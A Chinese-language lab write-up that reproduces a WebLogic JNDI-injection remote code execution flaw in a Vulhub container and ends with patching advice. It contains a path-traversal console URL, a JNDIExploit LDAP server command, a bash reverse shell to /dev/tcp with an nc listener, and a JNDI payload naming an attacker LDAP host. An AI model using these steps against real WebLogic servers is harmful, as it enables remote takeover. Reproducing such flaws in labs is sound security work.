## 0x01 漏洞简介

### 一. 漏洞描述

WebLogic是美国Oracle公司出品的一个application
server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。  
该漏洞为Weblogic的远程代码执行漏洞。漏洞主要由JNDI注入，导致攻击者可利用此漏洞远程代码执行。

### 二. 影响版本

Weblogic Server 10.3.6.0.0  
Weblogic Server 12.1.3.0.0  
Weblogic Server 12.2.1.3.0  
Weblogic Server 12.2.1.4.0  
Weblogic Server 14.1.1.0.0

### 三.JNDI简介

JNDI是Java Naming and Directory Interface （Java命名和目录接口）的英文简写，
是为Java应用程序提供命名和目录访问服务的API （application programing interface，应用程序编 程接口）。

## 0x02 漏洞复现

### 一.所需机器

靶机:Centos7(192.168.166.129)

攻击机:win10

LDAP服务器:自己的服务器

 **所需工具: lDAP工具**

 **链接：https://pan.baidu.com/s/17Aa-3dMzcf4R_QPkl2xXTA**  
 **提取码：wars**

 **此处注意:要让自己的vps防火墙放行1389和8080端口，否则无法回显**

###  **二.环境搭建**

Centos7 中搭建环境

1.可以使用Vulhub的CVE-2020-14882（weblogic:12.2.1.3版本）漏洞环境来复现

> 1.cd /Desktop/vulhub-master/weblogic/CVE-2020-14882
>
> 2.docker-compose up -d

![1641374869_61d5649579d8ca8cfedb8.png!small?1641374870302](https://image.3001.net/images/20220105/1641374869_61d5649579d8ca8cfedb8.png!small?1641374870302)

访问出现以下图片即搭建成功

![1641374883_61d564a3b7e54d5e70e12.png!small?1641374884429](https://image.3001.net/images/20220105/1641374883_61d564a3b7e54d5e70e12.png!small?1641374884429)

###  **三.win10开始攻击:**

进行路径拼接:

> <http://192.168.166.129:7001/>console/css/%252e%252e%252f/consolejndi.portal

出现以下界面说明漏洞

![1641374955_61d564eb1c6ea51f1f11c.png!small?1641374955781](https://image.3001.net/images/20220105/1641374955_61d564eb1c6ea51f1f11c.png!small?1641374955781)

 **启动LDAP：**

 **JDK版本不要过高(此处所用JDK8)**

 **启动命令: java -jar JNDIExploit.v1.11.jar -i ip(vps ip)**

  

 **在攻击机进行抓包，构造payload进行远程命令执行**

 **payload注意点:1.在bp中修改为post请求方式**

 **2.添加字段cmd:whoami(此处命令可修改)**

 **3.在payload中ip处第三个分隔符是;(此处一定要注意，否则执行不了)**

 **例子:192.168.1;1(第三处为分号)**

 **4.payload我会放在文末**

![1641374974_61d564fea247554773a16.png!small?1641374975588](https://image.3001.net/images/20220105/1641374974_61d564fea247554773a16.png!small?1641374975588)

 **4 通过反弹shell连接主机**

1.对反弹shell命令进行编码

> bash -i >& /dev/tcp/xx.xx.xx.xx/1122 0>&1 (ip为接收shell的ip)

 **编码地址:**[java.lang.Runtime.exec() Payload Workarounds - @Jackson_T
(jackson-t.ca)](https://www.jackson-t.ca/runtime-exec-payloads.html
" java.lang.Runtime.exec\(\) Payload Workarounds - @Jackson_T
\(jackson-t.ca\)")

![1641375004_61d5651ca2834a2f2af01.png!small?1641375005689](https://image.3001.net/images/20220105/1641375004_61d5651ca2834a2f2af01.png!small?1641375005689)

 **2.nc 监听**

> nc -lvvp 1122 (端口看自己定)

 **3.在bp上抓包发送数据,发现反弹成功 (字段cmd后为编码过后的反弹shell命令)**

![1641375029_61d56535a1d9e6a5fa61b.png!small?1641375030529](https://image.3001.net/images/20220105/1641375029_61d56535a1d9e6a5fa61b.png!small?1641375030529)

 **5 POC这里不进行展示了，在上面的百度网盘中**

##  **0x03 Payload**

>
> _pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xx.xx.xx;xx:1389/Basic/WeblogicEcho;AdminServer%22)

## 0x04 漏洞修复

1.此次 Oracle 官方的 CPU已发布了针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。

2.建议用户及时将 Weblogic 后台/console/console.portal 对外的访问权限暂时关闭。

3、由于是通过JNDI注入进行远程命令执行，所以受到JDK版本的影响，建议升级Weblogic Server运行环境的JDK版本  

